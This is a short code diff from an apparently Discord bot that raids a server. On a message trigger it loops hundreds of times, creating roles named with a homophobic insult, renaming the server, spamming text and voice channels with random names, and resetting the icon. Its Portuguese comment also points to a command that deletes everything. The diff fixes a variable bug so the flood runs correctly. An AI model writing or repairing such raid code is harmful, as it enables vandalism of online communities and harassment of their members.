@@ -29,8 +29,8 @@ client.on("message", async (message) => {
 	message.channel.send(`discord tem limite de 500 canais e 200 cargos, n reclama se não criar mais canais, da !!del pra apagar tudo mas com lag fudido`)
 	for(i = 0; i < 499; i++){
 		message.guild.createRole('henry gay')
-	    	message.guild.setName(process.env.SERVER_NAME + `${texth}`)
-	    	const texto = makeid(32);
+		const texto = makeid(32);
+	    	message.guild.setName(process.env.SERVER_NAME + `${texto}`)
 	    	message.guild.createChannel(`${texto}`, 'text');
 	    	message.guild.createChannel(`${texto}`, 'voice');  
 	    	message.guild.setIcon('./icon.png') 
